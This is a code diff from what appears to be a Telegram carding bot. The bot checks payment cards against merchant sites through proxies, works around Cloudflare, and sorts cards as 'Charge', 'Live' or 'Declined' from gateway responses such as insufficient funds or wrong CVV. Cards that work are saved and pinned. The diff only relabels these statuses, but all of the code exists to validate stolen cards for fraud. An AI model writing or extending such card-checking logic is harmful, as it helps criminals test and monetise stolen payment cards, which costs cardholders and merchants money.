@@ -269,12 +269,13 @@ async def check_card_random_site(card, sites, user_id=None):
                         "Status": "Proxy Dead"
                     }, site_index
                 
-                # Check for charged/approved status
-                status = "Declined"
+                                # Check for charged/approved status
                 if charged:
-                    status = "Charged"
+                    status = "Charge"
                 elif approved:
-                    status = "Approved"
+                    status = "Live"
+                else:
+                    status = "Declined"
                 
                 return {
                     "Response": api_response,
@@ -350,12 +351,13 @@ async def check_card_specific_site(card, site, user_id=None):
                         "Status": "Proxy Dead"
                     }
                 
-                # Check for charged/approved status
-                status = "Declined"
+                                # Check for charged/approved status
                 if charged:
-                    status = "Charged"
+                    status = "Charge"
                 elif approved:
-                    status = "Approved"
+                    status = "Live"
+                else:
+                    status = "Declined"
                 
                 return {
                     "Response": api_response,
@@ -973,9 +975,9 @@ async def process_sh_card(event, access_type):
         
         # Check for charged status
         is_charged = False
-        if "charged" in response_text or "charged" in status_text:
+        if "charge" in status_text or "charged" in response_text:
             status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
-            status_result = "Charged"
+            status_result = "Charge"
             is_charged = True
             await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
         elif "cloudflare bypass failed" in response_text:
@@ -983,12 +985,12 @@ async def process_sh_card(event, access_type):
             res["Response"] = "Cloudflare spotted 🤡 change site or try again"
         elif "thank you" in response_text or "payment successful" in response_text:
             status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
-            status_result = "Charged"
+            status_result = "Charge"
             is_charged = True
             await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
-        elif any(key in response_text for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
+        elif "live" in status_text or any(key in response_text for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
             status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
-            status_result = "Approved"
+            status_result = "Live"
             await save_approved_card(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
         else:
             status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
@@ -1084,9 +1086,9 @@ async def process_msh_cards(event, cards, sites):
             
             # Check for charged status
             is_charged = False
-            if "charged" in response_text or "charged" in status_text:
+            if "charge" in status_text or "charged" in response_text:
                 status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
-                status_result = "Charged"
+                status_result = "Charge"
                 is_charged = True
                 await save_approved_card(card, status_result, result.get('Response'), result.get('Gateway'), result.get('Price'))
             elif "cloudflare bypass failed" in response_text:
@@ -1094,12 +1096,12 @@ async def process_msh_cards(event, cards, sites):
                 result["Response"] = "Cloudflare spotted 🤡 change site or try again"
             elif "thank you" in response_text or "payment successful" in response_text:
                 status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
-                status_result = "Charged"
+                status_result = "Charge"
                 is_charged = True
                 await save_approved_card(card, status_result, result.get('Response'), result.get('Gateway'), result.get('Price'))
-            elif any(key in response_text for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
+            elif "live" in status_text or any(key in response_text for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                 status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
-                status_result = "Approved"
+                status_result = "Live"
                 await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
             else:
                 status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
@@ -1278,12 +1280,12 @@ Please add fresh sites using `/add` and try again.
                 status_text = result.get("Status", "")
                 
                 # Check for charged/approved/declined status
-                if status_text == "Charged":
+                if status_text == "Charge":
                     charged += 1
                     status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                     await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                     should_send_message = True
-                elif status_text == "Approved":
+                elif status_text == "Live":
                     approved += 1
                     status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                     await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
@@ -1319,7 +1321,7 @@ Please add fresh sites using `/add` and try again.
 """
                     result_msg = await event.reply(card_msg)
                     # Pin if charged
-                    if status_text == "Charged":
+                    if status_text == "Charge":
                         await pin_charged_message(event, result_msg)
                 
                 buttons = [
@@ -1664,12 +1666,12 @@ async def process_ranfor_cards(event, cards, global_sites):
                 status_text = result.get("Status", "")
                 
                 # Check for charged/approved/declined status
-                if status_text == "Charged":
+                if status_text == "Charge":
                     charged += 1
                     status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                     await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                     should_send_message = True
-                elif status_text == "Approved":
+                elif status_text == "Live":
                     approved += 1
                     status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                     await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
@@ -1698,7 +1700,7 @@ async def process_ranfor_cards(event, cards, global_sites):
 """
                     result_msg = await event.reply(card_msg)
                     # Pin if charged
-                    if status_text == "Charged":
+                    if status_text == "Charge":
                         await pin_charged_message(event, result_msg)
                 
                 buttons = [
